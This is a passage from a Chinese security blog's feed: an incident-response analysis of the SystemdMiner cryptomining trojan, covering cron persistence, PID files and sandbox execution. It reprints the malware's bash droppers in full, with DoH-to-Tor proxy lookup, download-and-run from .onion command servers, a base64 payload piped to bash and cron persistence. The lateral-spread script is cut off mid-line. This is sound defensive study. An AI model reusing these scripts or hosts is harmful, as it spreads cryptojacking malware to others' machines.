        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Password error, please try again" data-whm="Password error, please try again">  <script id="hbeData" type="hbeData" data-hmacdigest="f7a9c176ccc99f85ba422197c904a12ca40fdd78c982f9cb4fa31f4aea64c6f2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">Please input a password</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 渗透记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SystemedMiner挖矿木马分析与处置</title>
      <link href="/2022/04/01/%5B%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5D-SystemedMiner%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%84%E7%BD%AE/"/>
      <url>/2022/04/01/%5B%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%5D-SystemedMiner%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%84%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="SystemedMiner挖矿木马分析与处置"><a href="#SystemedMiner挖矿木马分析与处置" class="headerlink" title="SystemedMiner挖矿木马分析与处置"></a>SystemedMiner挖矿木马分析与处置</h1><p>最新补充：因为这类病毒涉及二进制知识较多，且自己水平有限，参考师傅们博客较多，可能会有哪些地方理解错误，还请各位师傅指正。</p><p>感谢一条咸鱼师傅的指正：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051053459.png" alt="image-20230405105350408"></p><hr><p>先登陆到208的主机去查看一下，查看下进程CPU使用率正常，并无挖矿迹象，可能是防火墙策略开启，木马连接不上矿池，先暂时隐蔽下来了</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051110091.png" alt="在这里插入图片描述"></p><p>（这里要注意的是区分系统进程和木马进程，因为很多木马的进程都是以随机字符名称出现的，例如<code>kswapd1</code>和<code>kswapd0</code>也比较类似，但是这两个进程是系统进程，所以不要混淆，其实如果挖矿进程在跑的话，很容易便会发现其进程PID和名称）</p><p>通常挖矿木马都会去写一个计划任务，来防止挖矿进程被删掉，这里看了一位大师傅的溯源分析，提到了cron在执行时，会读取三个地方的配置文件：一是<code>/etc/crontab</code>，二是<code>/etc/cron.d</code>目录下的所有文件，三是每个用户的配置文件，所以挖矿木马可能会有多个定时任务存在</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l </span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051110260.png" alt="="></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/cron.d/</span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111785.png" alt="在这里插入图片描述"></p><p>果然存在两个定时任务，查看一下里面的内容两个文件内容一致，且内容为base64编码，先对其进行解码处理，而且<code>virustotal</code>判断为恶意文件</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111124.png" alt="在这里插入图片描述"></p><p>分析一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">uMjSD9OaH5uA4C3CCjD4q2XEwo1s0H0</span><br><span class="line">exec &amp;&gt;/dev/null #不输出出错和输出信息</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取当前用户的家目录</span></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">获取执行命令</span></span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C&amp;C域名为fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.*</span></span><br><span class="line">t=$(echo &quot;fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad&quot;)</span><br><span class="line"></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(dns.digitale-gesellschaft.ch doh.li doh.pub fi.doh.dns.snopyta.org hydra.plan9-ns1.com resolver-eu.lelux.fi dns.hostux.net dns.twnic.tw doh-fi.blahdns.com resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)#代理域名relay.tor2socks.in</span><br><span class="line">q=$&#123;n[$((RANDOM%$&#123;#n[@]&#125;))]&#125;</span><br><span class="line">s=$($c https://$q/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &#x27; &#x27; &#x27;\n&#x27;|grep -Ev [.]0|sort -uR|tail -1)</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在几个目录路径里寻找一个有读写权限的路径</span></span><br><span class="line">fexe() &#123;</span><br><span class="line">for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u() &#123;</span><br><span class="line">sockz</span><br><span class="line">f=/int.$(uname -m)</span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-) #用当前时间生成 md5 码</span><br><span class="line">r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &#x27;inet &#x27;|awk &#123;&#x27;print $2&#x27;&#125;|md5sum|awk &#123;&#x27;print $1&#x27;&#125;)_$(crontab -l|base64 -w0)#crontab计划任务执行</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载病毒母体，随机方式进行命名，通过socket5的方式用relay.tor2socks.in代理访问C&amp;C域名</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">c -x socks5h://<span class="variable">$s</span>:9050 <span class="variable">$t</span>.onion<span class="variable">$f</span> -o<span class="variable">$x</span> -e<span class="variable">$r</span> || <span class="variable">$c</span> $1<span class="variable">$f</span> -o<span class="variable">$x</span> -e<span class="variable">$r</span></span></span><br><span class="line">chmod +x $x;$x;rm -f $x#运行后删除病毒文件</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for h in tor2web.in tor2web.it</span><br><span class="line">do</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查木马是否存在，若不存在则调用fexe测试执行，接着调用u <span class="variable">$t</span>.<span class="variable">$h</span> 进行木马文件的下载</span></span><br><span class="line">if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then</span><br><span class="line">fexe;u $t.$h</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">再次查看进程状态，若没有继续下载木马</span></span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)</span><br><span class="line">else</span><br><span class="line">break</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p><code>sockz()</code>函数通过<code>doh</code>查询IP，通过这种方法既可以提供加密保护dns查询结果，又可以绕过各大厂商IDS里恶意域名的IOC</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://doh.pub/dns-query?name=relay.tor2socks.in</span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111454.png" alt="在这里插入图片描述"></p><p>经过分析，这个样本的执行的总体流程如下：</p><ol><li>doh解析域名获取tor代理IP</li><li>查找目标主机可读写的路径</li><li>通过tor代理在C&amp;C服务器上下载与目标主机硬件版本相匹配的恶意文件</li><li>开启crontab计划任务并执行</li><li>根据pid文件返回脚本执行结果并进行判断</li></ol><p>根据这个样本的特征查了下资料，发现和<code>SystemdMiner</code>挖矿木马比较类似，特点如下：</p><ul><li>访问带有<code>tor2web、onion</code>字符串的域名</li><li>在/tmp目录下有<code>systemd*</code>的文件</li></ul><p>并且这个<code>SystemdMiner</code>是一个变种，除了更新了C&amp;C域名，使用socks5代理的方式访问C&amp;C域名从而实现绕过安全网关的目的，其余的特征与以往其他版本类似，通过上面的分析，知道该脚本会创建一个<code>/tmp/.X11-unix/</code>文件夹，里面存放着的是进程PID</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111664.png" alt="在这里插入图片描述"></p><p>通过PID找一下病毒文件位置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /proc/&#123;PID&#125;/exe</span><br></pre></td></tr></table></figure><p>发现病毒文件已经都被删除，查看一下00、01这些文件是什么时间创建的，可以对比一下其他机器的时间，找出最早的时间，方便后面的溯源</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111649.png" alt="在这里插入图片描述"></p><p>看了许多师傅们分析的文章，<code>.X11-unix</code>文件夹下的文件作用如下：</p><table><thead><tr><th>01</th><th>文件</th><th>守护进程pid</th></tr></thead><tbody><tr><td>11</td><td>文件</td><td>病毒运行进程pid</td></tr><tr><td>22</td><td>文件</td><td>可能为SSH爆破进程pid</td></tr></tbody></table><p>查看一下01和11的进程状态</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status</span><br><span class="line">2.ps -ef|grep 13485 </span><br><span class="line">3.lsof -p 13485</span><br></pre></td></tr></table></figure><p>01通过 lsof 判断，没有发现有外连或打开端口的现象</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111808.png" alt="在这里插入图片描述"></p><p>再查看11的进程状态，发现有外连</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111572.png" alt="在这里插入图片描述"></p><p>但是较为奇怪的是，攻击者只是上传了一个守护进程，找不到下载的病毒文件，CPU也没有异常，为了防止出现问题，还是先将定时任务以及进程先杀掉，接下来将病毒文件下载起来在虚拟机执行一下。</p><h4 id="虚拟机执行测试"><a href="#虚拟机执行测试" class="headerlink" title="虚拟机执行测试"></a>虚拟机执行测试</h4><p>先按照守护进程下载病毒文件的方式，将病毒文件下载起来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -4fsSLkA- -m200 fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.tor2web.it/int.x86_64 -o  int.x86_64 -e183.134.110.75</span></span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111362.png" alt="在这里插入图片描述"></p><p>执行一下该ELF文件，发现<code>crotab</code>定时任务增加了新的一项任务，且root目录下生成了该任务所指向的新的脚本文件</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111353.png" alt="在这里插入图片描述"></p><p>查看一下该脚本文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">FBGJOndscVOU2PKZGWF8C6kibWnyHLP</span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line">t=$(echo &quot;4t5ypbzi2kko7tqmk6y345ntpmctwj5jmu3cebxsnonsdljyyfs335ad&quot;)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C&amp;C服务器域名前缀不同</span></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(dns.digitale-gesellschaft.ch doh.li doh.pub fi.doh.dns.snopyta.org hydra.plan9-ns1.com resolver-eu.lelux.fi dns.hostux.net dns.twnic.tw doh-fi.blahdns.com resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)</span><br><span class="line">q=$&#123;n[$((RANDOM%$&#123;#n[@]&#125;))]&#125;</span><br><span class="line">s=$($c https://$q/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &#x27; &#x27; &#x27;\n&#x27;|grep -Ev [.]0|sort -uR|tail -1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fexe() &#123;</span><br><span class="line">for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u() &#123;</span><br><span class="line">sockz</span><br><span class="line">f=/int.$(uname -m)</span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-)</span><br><span class="line">r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &#x27;inet &#x27;|awk &#123;&#x27;print $2&#x27;&#125;|md5sum|awk &#123;&#x27;print $1&#x27;&#125;)_$(crontab -l|base64 -w0)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">c -x socks5h://<span class="variable">$s</span>:9050 <span class="variable">$t</span>.onion<span class="variable">$f</span> -o<span class="variable">$x</span> -e<span class="variable">$r</span> || <span class="variable">$c</span> $1<span class="variable">$f</span> -o<span class="variable">$x</span> -e<span class="variable">$r</span></span></span><br><span class="line">chmod +x $x;$x;rm -f $x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for h in tor2web.in tor2web.it</span><br><span class="line">do</span><br><span class="line">if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then</span><br><span class="line">fexe;u $t.$h</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)</span><br><span class="line">else</span><br><span class="line">break</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>这个脚本和之前服务器存在的那个守护进程脚本功能相同(都是通过<code>tor</code>代理从<code>C&amp;C</code>服务器上down下木马文件并执行)，但和上面服务器的那个脚本对比一下也会发现有两处不同的地方：</p><ol><li>新脚本文件的<code>C&amp;C</code>服务器域名前缀与前面的不同</li><li>代码前的字符串不同，之前服务器上的是<code>uMjSD9OaH5uA4C3CCjD4q2XEwo1s0H0</code>，而新的脚本文件中则是<code>FBGJOndscVOU2PKZGWF8C6kibWnyHLP</code>，与文件名相同</li></ol><p>猜测代码前的字符串便是其命名中的一部分，就对该字符串进行一次全局搜索</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / 2&gt;/dev/null | grep FBGJOndscVOU2PKZGWF8C6kibWnyHLP</span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111086.png" alt="在这里插入图片描述"></p><p>发现三个类似的脚本文件，查看了一下内容都一致，应该是作为备份文件以防其中某一个被删</p><p>查看了深信服千里目安全实验室的文章和此类情况类似，可以从病毒母体ELF文件中逆向分析出5个不同的bash命令，若tor代理可用则可以使用下面的方法去下载出各个模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -4fsSLkA -m200 -x socks5h://92.190.141.62:9050 4t5ypbzi2kko7tqmk6y345cebxsnonsdljyyfs335ad.onion/sshd ntpmctwj5jmu3cebxsnonsdljyyfs335ad.onion/sshd </span><br></pre></td></tr></table></figure><p>但由于目前还不会IDA逆向调试，而且tor代理IP拒绝连接，就先使用师傅扒出来源码学习一下</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051111386.png" alt="在这里插入图片描述"></p><p>分别用于下载不同模块和执行不同的功能，功能如下：</p><ul><li><strong>本机持久化</strong>：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line"></span><br><span class="line">x() &#123;</span><br><span class="line">if ! ls $d/.systemd-private-*.sh; then</span><br><span class="line">grep &quot;C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu&quot; $d/.systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh || echo -e &quot;#\x21/bin/bash\nexec &amp;&gt;/dev/null\necho C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu\necho QzBQZ0Z6MkpIY3Bzd1ZNT0s3WFNIUW9kRE9yQVdJS3UKZXhlYyAmPi9kZXYvbnVsbApleHBvcnQgUEFUSD0kUEFUSDokSE9NRTovYmluOi9zYmluOi91c3IvYmluOi91c3Ivc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL2xvY2FsL3NiaW4KCmQ9JChncmVwIHg6JChpZCAtdSk6IC9ldGMvcGFzc3dkfGN1dCAtZDogLWY2KQpjPSQoZWNobyAiY3VybCAtNGZzU0xrQS0gLW0yMDAiKQp0PSQoZWNobyAid2FjcG5uc280b3R0eGx5dmpwMmFkYWllYWl2eHgyc2F4b3ltZWRuaWRwM3p5Zm9xZmM1anBxYWQiKQoKc29ja3ooKSB7Cm49KGRvaC50aGlzLndlYi5pZCBkb2gucG9zdC1mYWN0dW0udGsgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgcmVzb2x2ZXItZXUubGVsdXguZmkgZG9oLmxpIGRucy5kaWdpdGFsZS1nZXNlbGxzY2hhZnQuY2gpCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTExKSldfS8kcCB8IGdyZXAgLW9FICJcYihbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfVxiIiB8dHIgJyAnICdcbid8Z3JlcCAtRXYgWy5dMHxzb3J0IC11UnxoZWFkIC1uIDEpCn0KCmZleGUoKSB7CmZvciBpIGluIC4gJEhPTUUgL3Vzci9iaW4gJGQgL3Zhci90bXAgO2RvIGVjaG8gZXhpdCA+ICRpL2kgJiYgY2htb2QgK3ggJGkvaSAmJiBjZCAkaSAmJiAuL2kgJiYgcm0gLWYgaSAmJiBicmVhaztkb25lCn0KCnUoKSB7CnNvY2t6CmY9L2ludC4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSkKcj0kKGN1cmwgLTRmc1NMayBjaGVja2lwLmFtYXpvbmF3cy5jb218fGN1cmwgLTRmc1NMayBpcC5zYilfJCh3aG9hbWkpXyQodW5hbWUgLW0pXyQodW5hbWUgLW4pXyQoaXAgYXxncmVwICdpbmV0ICd8YXdrIHsncHJpbnQgJDInfXxtZDVzdW18YXdrIHsncHJpbnQgJDEnfSlfJChjcm9udGFiIC1sfGJhc2U2NCAtdzApCiRjIC14IHNvY2tzNWg6Ly8kczo5MDUwICR0Lm9uaW9uJGYgLW8keCAtZSRyIHx8ICRjICQxJGYgLW8keCAtZSRyCmNobW9kICt4ICR4OyR4O3JtIC1mICR4Cn0KCmZvciBoIGluIHRvcjJ3ZWIuaW4gdG9yMndlYi5pdApkbwppZiAhIGxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXM7IHRoZW4KZmV4ZTt1ICR0LiRoCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC90bXA7dSAkdC4kaCkKbHMgL3Byb2MvJChoZWFkIC1uIDEgL3RtcC8uWDExLXVuaXgvMDEpL3N0YXR1cyB8fCAoY2QgL2Rldi9zaG07dSAkdC4kaCkKZWxzZQpicmVhawpmaQpkb25lCg==|base64 -d|bash&quot; &gt; $d/.systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh</span><br><span class="line">touch -r /bin/grep $d/.systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh</span><br><span class="line">chmod +x $d/.systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh</span><br><span class="line">fi</span><br><span class="line">if ! ls /opt/systemd-private-*.sh; then</span><br><span class="line">grep &quot;C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu&quot; /opt/systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh || echo -e &quot;与上面内容相同|base64 -d|bash&quot; &gt; /opt/systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh</span><br><span class="line">touch -r /bin/grep /opt/systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh</span><br><span class="line">chmod +x /opt/systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh</span><br><span class="line">fi</span><br><span class="line">if ! ls /etc/cron.d/0systemd-private-*; then</span><br><span class="line">grep C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu /etc/cron.d/0systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu || echo &quot;$(echo $((RANDOM%59))) * * * * root /opt/systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh &gt; /dev/null 2&gt;&amp;1 &amp;&quot; &gt; /etc/cron.d/0systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu</span><br><span class="line">touch -r /bin/grep /etc/cron.d/0systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu</span><br><span class="line">fi</span><br><span class="line">if ! crontab -l | grep ^[0-9] | grep systemd-private; then</span><br><span class="line">(echo &quot;$(echo $((RANDOM%59))) * * * * $d/.systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh &gt; /dev/null 2&gt;&amp;1 &amp;&quot;;crontab -l|grep -v systemd-private-C0PgFz2JHcpswVMOK7XSHQodDOrAWIKu.sh)|crontab -</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码便是创建定时任务，这段代码共创建三个定时任务</p><ol><li><code>/etc/cron.d/0systemd-private-*</code></li><li><code>/opt/systemd-private-*</code></li><li><code>/root/systemd-private-*</code></li></ol><p>而其中的base64代码的任务便是下载母体木马int文件，和上面的守护进程内容一致</p><ul><li><strong>竞争对手清理</strong>：这个脚本的主要作用便是清除服务器上其他的挖矿木马，改写hosts文件让其他挖矿无法访问对应的域名，但是经过查询虚拟机的hosts文件，并没有发现被修改（可能是tor代理节点失效了，没有下载该模块）</li></ul><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304051112437.png" alt="在这里插入图片描述"></p><ul><li><strong>内网传播</strong></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line">t=$(echo &quot;5ixhieezozxwnvisopgxoba6ssbsrvdpxeduxb4jc6zx7s56rufrjzad&quot;)</span><br><span class="line"></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(doh.this.web.id doh.post-factum.tk dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh-fi.blahdns.com fi.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)</span><br><span class="line">s=$($c 